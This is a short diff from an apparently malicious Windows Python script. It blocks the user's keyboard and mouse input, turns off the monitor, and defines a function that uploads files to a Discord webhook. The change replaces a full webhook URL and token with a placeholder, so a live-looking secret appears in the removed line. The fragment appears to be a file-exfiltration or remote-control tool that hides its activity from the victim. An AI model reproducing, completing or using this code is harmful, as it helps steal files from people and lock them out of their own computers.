@@ -10,7 +10,7 @@ ctypes.windll.user32.BlockInput(True)
 ctypes.windll.user32.SendMessageW(0xFFFF, 0x112, 0xF170, 2)
 
 # Replace with your Discord webhook URL
-WEBHOOK_URL = "https://discord.com/api/webhooks/1116752197175222353/AyXcQi4PR8lGZPFSAMEaMl2kenrbU5F1isK3Mx_VoZwDU9Eejha3v0GDHDoibjm6hsq8"
+WEBHOOK_URL = "insert URL here"
 
 def upload_file(file_path):
     try:
